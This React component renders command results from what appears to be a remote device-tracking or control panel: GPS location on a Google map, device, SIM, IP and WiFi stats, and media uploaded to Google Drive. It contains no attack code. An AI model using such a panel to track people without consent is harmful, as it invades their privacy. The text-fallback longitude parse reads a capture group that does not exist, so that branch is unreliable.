'use client';

import React from 'react';

interface TelemetryModalProps {
  selectedOutput: string;
  history: any[];
  onClose: () => void;
  onDeleteData: (commandName?: string) => void;
}

export default function TelemetryModal({ selectedOutput, history, onClose, onDeleteData }: TelemetryModalProps) {
  const matchingEntries = history.filter(h => h.command === selectedOutput || h.command.startsWith(selectedOutput));
  if (matchingEntries.length === 0) return null;
  const res = matchingEntries[0];

  const handleCopy = (text: string, label: string) => {
    navigator.clipboard.writeText(text);
    alert(`Copied ${label} to clipboard!`);
  };

  const renderTelemetryContent = (rawPayload: any) => {
    if (!rawPayload) return null;

    let payload = rawPayload;
    if (typeof payload === 'object' && payload.type === 'text' && typeof payload.content === 'string') {
      try {
        const parsed = JSON.parse(payload.content);
        payload = parsed;
      } catch {
        payload = payload.content;
      }
    }

    // Structured JSON Payload
    if (typeof payload === 'object') {
      if (payload.type === 'location') {
        const { lat, lon, provider, accuracy, battery, batteryLevel, speed, altitude } = payload;
        const googleEmbedUrl = `https://maps.google.com/maps?q=${lat},${lon}&t=&z=15&ie=UTF8&iwloc=&output=embed`;
        const battText = battery || (batteryLevel !== undefined ? `${batteryLevel}%` : null);

        return (
          <div style={{ display: 'flex', flexDirection: 'column', gap: '1rem', width: '100%' }}>
            <div style={{ width: '100%', height: '300px', borderRadius: '12px', overflow: 'hidden', border: '1px solid #30363d', boxShadow: '0 4px 20px rgba(0,0,0,0.5)' }}>
              <iframe width="100%" height="100%" frameBorder="0" scrolling="no" src={googleEmbedUrl} style={{ border: 'none' }}></iframe>
            </div>
            <div style={{
              fontSize: '0.85rem',
              backgroundColor: '#0d1117',
              border: '1px solid #30363d',
              padding: '0.85rem',
              borderRadius: '8px',
              display: 'grid',
              gridTemplateColumns: 'repeat(auto-fit, minmax(140px, 1fr))',
              gap: '8px',
              width: '100%',
              color: '#f0f6fc'
            }}>
              <div style={{ wordBreak: 'break-all' }}>
                <strong>Latitude:</strong> {lat}
                <button type="button" onClick={() => handleCopy(`${lat}`, 'Latitude')} style={{ background: 'none', border: 'none', cursor: 'pointer', marginLeft: '6px' }}>📋</button>
              </div>
              <div style={{ wordBreak: 'break-all' }}>
                <strong>Longitude:</strong> {lon}
                <button type="button" onClick={() => handleCopy(`${lon}`, 'Longitude')} style={{ background: 'none', border: 'none', cursor: 'pointer', marginLeft: '6px' }}>📋</button>
              </div>
              <div><strong>Provider:</strong> {provider || 'GPS'}</div>
              {accuracy && <div><strong>Accuracy:</strong> {accuracy}</div>}
              {battText && <div><strong>Battery:</strong> {battText} 🔋</div>}
              {speed && <div><strong>Speed:</strong> {speed}</div>}
              {altitude && <div><strong>Altitude:</strong> {altitude}</div>}
            </div>
            <div style={{ display: 'flex', gap: '8px' }}>
              <a href={`https://maps.google.com/?q=${lat},${lon}`} target="_blank" rel="noreferrer" className="btn btn-primary" style={{ textAlign: 'center', textDecoration: 'none', flex: 1, padding: '0.75rem' }}>
                Open in Google Maps ↗
              </a>
              <button type="button" onClick={() => handleCopy(`https://maps.google.com/?q=${lat},${lon}`, 'Maps Link')} className="btn" style={{ padding: '0.75rem 12px' }}>
                📋 Copy Link
              </button>
            </div>
          </div>
        );
      }

      if (payload.type === 'media' || payload.url) {
        const url = payload.url || payload.content;
        return (
          <div style={{
            display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center',
            padding: '2rem 1rem', textAlign: 'center', backgroundColor: 'rgba(15, 157, 88, 0.15)',
            borderRadius: '12px', border: '1px solid rgba(15, 157, 88, 0.4)', width: '100%'
          }}>
            <div style={{ fontSize: '2.5rem', marginBottom: '0.75rem' }}>📁</div>
            <h3 style={{ fontSize: '1.1rem', marginBottom: '1rem', color: '#2ea043' }}>Media Saved to Google Drive</h3>
            <div style={{ display: 'flex', gap: '8px', width: '100%', maxWidth: '340px' }}>
              <a href={url} target="_blank" rel="noreferrer" className="btn btn-primary" style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px', flex: 1, textDecoration: 'none', backgroundColor: '#2ea043', color: '#fff', border: 'none' }}>
                <span>↗️</span> Open Drive
              </a>
              <button type="button" onClick={() => handleCopy(url, 'Google Drive URL')} className="btn" style={{ padding: '8px 12px' }}>
                📋 Copy
              </button>
            </div>
          </div>
        );
      }

      if (payload.type === 'stats') {
        const { device, os, battery, sim, ips, wifi } = payload;
        const items = [
          { icon: '📱', label: 'Device', value: device },
          { icon: '💻', label: 'OS', value: os },
          { icon: '🔋', label: 'Battery', value: battery ? `${battery}%` : 'N/A' },
          { icon: '📶', label: 'SIM', value: sim },
          { icon: '🌐', label: 'IPs', value: ips },
          { icon: '📡', label: 'WiFi', value: wifi },
        ].filter(item => item.value);

        return (
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))', gap: '0.75rem', width: '100%' }}>
            {items.map((item, idx) => (
              <div key={idx} style={{ backgroundColor: '#0d1117', padding: '0.85rem', borderRadius: '8px', border: '1px solid #30363d' }}>
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '0.25rem' }}>
                  <div style={{ fontSize: '0.75rem', color: '#8b949e', textTransform: 'uppercase' }}>
                    {item.icon} {item.label}
                  </div>
                  <button type="button" onClick={() => handleCopy(`${item.value}`, item.label)} style={{ background: 'none', border: 'none', cursor: 'pointer', fontSize: '0.9rem' }}>📋</button>
                </div>
                <div style={{ fontSize: '0.95rem', fontWeight: '500', wordBreak: 'break-word', color: '#f0f6fc' }}>{item.value}</div>
              </div>
            ))}
          </div>
        );
      }

      return (
        <div style={{ position: 'relative' }}>
          <button type="button" onClick={() => handleCopy(JSON.stringify(payload, null, 2), 'Output JSON')} style={{ position: 'absolute', top: '8px', right: '8px', padding: '4px 8px', fontSize: '0.75rem', borderRadius: '4px', border: '1px solid #30363d', background: '#21262d', color: '#fff', cursor: 'pointer' }}>
            📋 Copy JSON
          </button>
          <pre style={{ whiteSpace: 'pre-wrap', lineHeight: '1.5', overflowX: 'auto', maxWidth: '100%', color: '#f0f6fc' }}>{JSON.stringify(payload, null, 2)}</pre>
        </div>
      );
    }

    const text = `${payload}`;
    let lat: number | null = null;
    let lon: number | null = null;

    const mapsMatch = text.match(/https?:\/\/[^\s]*[\?&](?:q|ll|query)=(-?\d+(?:\.\d+)?),(-?\d+(?:\.\d+)?)/i);
    if (mapsMatch) {
      lat = parseFloat(mapsMatch[1]);
      lon = parseFloat(mapsMatch[2]);
    }

    if (!lat || !lon) {
      const latMatch = text.match(/Lat(?:itude)?:\s*(-?\d+(?:\.\d+)?)/i);
      const lonMatch = text.match(/Lon(?:gitude)?:\s*(-?\d+(?:\.\d+)?)/i);
      if (latMatch && lonMatch) {
        lat = parseFloat(latMatch[1]);
        lon = parseFloat(lonMatch[2]);
      }
    }

    if (lat && lon) {
      const googleEmbedUrl = `https://maps.google.com/maps?q=${lat},${lon}&t=&z=15&ie=UTF8&iwloc=&output=embed`;
      return (
        <div style={{ display: 'flex', flexDirection: 'column', gap: '1rem', width: '100%' }}>
          <div style={{ width: '100%', height: '300px', borderRadius: '12px', overflow: 'hidden', border: '1px solid #30363d', boxShadow: '0 4px 20px rgba(0,0,0,0.5)' }}>
            <iframe width="100%" height="100%" frameBorder="0" scrolling="no" src={googleEmbedUrl} style={{ border: 'none' }}></iframe>
          </div>
          <div style={{ fontSize: '0.85rem', backgroundColor: '#0d1117', border: '1px solid #30363d', padding: '0.85rem', borderRadius: '8px', fontFamily: 'monospace', whiteSpace: 'pre-wrap', wordBreak: 'break-word', width: '100%', color: '#f0f6fc' }}>
            {text}
          </div>
          <div style={{ display: 'flex', gap: '8px' }}>
            <a href={`https://maps.google.com/?q=${lat},${lon}`} target="_blank" rel="noreferrer" className="btn btn-primary" style={{ textAlign: 'center', textDecoration: 'none', flex: 1, padding: '0.75rem' }}>
              Open in Google Maps ↗
            </a>
            <button type="button" onClick={() => handleCopy(text, 'Location Response')} className="btn" style={{ padding: '0.75rem 12px' }}>
              📋 Copy Text
            </button>
          </div>
        </div>
      );
    }

    const isError = text.toLowerCase().includes('failed');
    if (isError) {
      return (
        <div style={{
          display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center',
          padding: '2rem 1rem', textAlign: 'center', backgroundColor: 'rgba(248, 81, 73, 0.15)',
          borderRadius: '12px', border: '1px solid rgba(248, 81, 73, 0.4)', width: '100%'
        }}>
          <div style={{ fontSize: '2.5rem', marginBottom: '0.5rem' }}>❌</div>
          <h3 style={{ fontSize: '1.1rem', marginBottom: '0.5rem', color: '#f85149' }}>Task Failed</h3>
          <p style={{ color: '#c9d1d9', fontSize: '0.9rem', wordBreak: 'break-word' }}>{text}</p>
        </div>
      );
    }

    return (
      <div style={{ position: 'relative', width: '100%' }}>
        <button type="button" onClick={() => handleCopy(text, 'Response Text')} style={{ position: 'absolute', top: '-10px', right: '0', padding: '4px 10px', fontSize: '0.75rem', borderRadius: '4px', border: '1px solid #30363d', background: '#21262d', color: '#f0f6fc', cursor: 'pointer' }}>
          📋 Copy Text
        </button>
        <div style={{ whiteSpace: 'pre-wrap', lineHeight: '1.6', wordBreak: 'break-word', width: '100%', color: '#f0f6fc', paddingTop: '1rem' }}>{text}</div>
      </div>
    );
  };

  return (
    <div style={{
      position: 'fixed', top: 0, left: 0, right: 0, bottom: 0,
      backgroundColor: 'rgba(0,0,0,0.85)', zIndex: 1200,
      display: 'flex', justifyContent: 'center', alignItems: 'center', padding: '0.75rem'
    }} onClick={onClose}>
      <div style={{
        width: '100%', maxWidth: '750px', maxHeight: '92vh', overflowY: 'auto',
        padding: '1.5rem 1.25rem', position: 'relative', border: '1px solid #30363d',
        backgroundColor: '#161b22', borderRadius: '12px', boxShadow: '0 8px 32px rgba(0,0,0,0.8)'
      }} onClick={e => e.stopPropagation()}>
        <button onClick={onClose} style={{
          position: 'absolute', top: '1rem', right: '1rem', background: 'none', border: 'none',
          color: '#8b949e', fontSize: '1.5rem', cursor: 'pointer', lineHeight: '1'
        }}>×</button>

        <h2 style={{ fontSize: '1.3rem', marginBottom: '0.5rem', textTransform: 'capitalize', display: 'flex', flexWrap: 'wrap', gap: '10px', alignItems: 'center', justifyContent: 'space-between', color: '#f0f6fc' }}>
          <span>{selectedOutput} Output</span>
          <button onClick={() => onDeleteData(selectedOutput)} className="btn btn-danger" style={{ padding: '4px 10px', fontSize: '0.75rem', marginRight: '2rem' }}>
            Delete Entry
          </button>
        </h2>
        <div style={{ color: '#8b949e', marginBottom: '1rem', fontSize: '0.85rem' }}>
          Received: {new Date(res.timestamp).toLocaleString()}
        </div>

        <div style={{
          backgroundColor: '#0d1117', padding: '1.25rem 1rem', borderRadius: '12px',
          border: '1px solid #30363d', color: '#f0f6fc', width: '100%', overflowX: 'hidden'
        }}>
          {renderTelemetryContent(res.payload)}
        </div>
      </div>
    </div>
  );
}
